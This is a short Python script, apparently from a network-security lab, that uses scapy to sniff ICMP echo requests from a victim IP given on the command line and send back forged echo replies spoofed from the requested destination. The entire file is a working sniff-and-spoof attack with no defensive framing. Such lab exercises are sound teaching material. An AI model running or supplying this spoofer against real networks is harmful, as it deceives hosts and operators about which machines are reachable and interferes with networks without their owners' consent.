#!/usr/bin/python3
from scapy.all import *
import sys

VICTIM=sys.argv[1]

# spoof
def spoof(pkt):
	if ICMP in pkt:
		# [ICMP].type = 8 for echo req and 0 for reply
		if pkt[ICMP].type == 8:
			srcIP = pkt[IP].dst
			dstIP = pkt[IP].src
			ihl = pkt[IP].ihl
			icmpType = 0
			icmpID = pkt[ICMP].id
			icmpSEQ = pkt[ICMP].seq 
			a = IP(src=srcIP, dst=dstIP, ihl=ihl)
			b = ICMP(type=icmpType, id=icmpID, seq=icmpSEQ)
			data = pkt[Raw].load
			pkt = a/b/data
			send(pkt, verbose=0)
# sniff
sniff(filter='icmp and src host {}'.format(VICTIM),prn=spoof)
